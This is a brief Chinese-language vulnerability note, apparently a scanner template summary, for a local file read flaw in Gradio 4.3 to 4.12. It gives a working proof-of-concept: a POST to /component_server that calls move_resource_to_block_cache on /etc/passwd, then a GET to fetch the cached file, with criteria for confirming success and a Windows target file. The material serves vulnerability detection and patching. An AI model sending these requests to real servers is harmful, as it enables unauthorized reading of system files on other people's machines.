验证漏洞存在方法
    - 发送POST请求到目标服务器的/component_server端点，调用Components类的move_resource_to_block_cache方法读取系统文件

漏洞利用方法
    - 该漏洞存在于Gradio 4.3-4.12版本中，攻击者可以通过调用Components类的任意方法实现本地文件读取
    - 通过构造特定的JSON请求，利用move_resource_to_block_cache方法将目标文件移动到缓存中，然后通过GET请求读取文件内容
    - PoC:
      ```
      POST /component_server HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/json
      
      {"component_id": "1", "data": "/etc/passwd", "fn_name": "move_resource_to_block_cache", "session_hash": "aaaaaaaaaaa"}
      
      GET /file={{download_path}} HTTP/1.1
      Host: {{Hostname}}
      ```
    - 支持读取的文件包括：/etc/passwd（Linux系统）和c:\\windows\\win.ini（Windows系统）
    - 成功利用的标志：响应状态码为200，Content-Type为text/plain，且响应体包含系统文件内容（如root用户信息或Windows配置文件内容）
